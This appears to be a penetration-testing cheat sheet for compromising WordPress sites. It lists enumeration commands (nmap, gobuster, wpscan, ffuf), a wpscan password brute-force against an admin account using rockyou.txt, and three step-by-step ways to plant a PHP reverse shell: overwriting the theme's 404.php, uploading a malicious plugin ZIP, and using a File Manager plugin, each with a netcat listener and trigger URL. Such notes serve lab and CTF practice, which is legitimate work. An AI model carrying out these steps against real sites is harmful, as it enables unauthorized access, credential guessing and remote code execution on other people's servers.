# Wordpress
<img width="1024" height="1024" alt="Husky hacker hacking wordpress" src="https://github.com/user-attachments/assets/99be5e08-f950-4106-978f-a8299dd5b6b8" />

## Enumerate like normal

```
nmap -sV -sC -p 80,443 <target_ip>
gobuster dir -u http://<ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
Once found, use this:
```
wpscan --url http://<target_url> --enumerate vp,vt,u
wpscan --url http://<target_url> --enumerate p --plugins-detection aggressive
ffuf -u http://<ip>/wp-content/plugins/FUZZ -w wp-plugins.txt
```
For user enumeration:
```
wpscan --url http://$target/ --enumerate u 
```
If the user is found, try this:
```
wpscan --url <URL> -U admin -P /usr/share/wordlists/rockyou.txt
```
Then go to the reverse shell generator:

https://www.revshells.com/#bind

Get the php script with current attacks. 

## Theme File attack
Navigate to Appearance > Theme File Editor in the WordPress sidebar.

Select a File: Choose 404 Template (404.php) from the file list on the right.

Overwrite: Delete the existing code and paste your entire PHP reverse shell script.

Update: Click Update File.

Trigger: Start your Netcat listener (nc -lvnp <port>) and visit the URL to trigger it:
```
http://<target_ip>/wp-content/themes/<theme_name>/404.php
```
## Mailcious Plugin
Prepare the ZIP: Put your shell.php into a folder, and compress it into a .zip file.

Upload: Go to Plugins > Add New > Upload Plugin.

Install & Activate: Select your ZIP file, click Install Now, and then Activate Plugin.

Note: The activation might "hang" or time out; this often means your shell has successfully connected back to your listener.

Trigger: If it doesn't trigger on activation, visit:
```
http://<target_ip>/wp-content/plugins/<plugin_folder>/shell.php. 
```
## File Manager Plugin
Open the File Manager from the sidebar.

Upload your .php file directly to the /wp-content/uploads/ directory.

Trigger it by navigating to:
```
http://<target_ip>/wp-content/uploads/shell.php
```
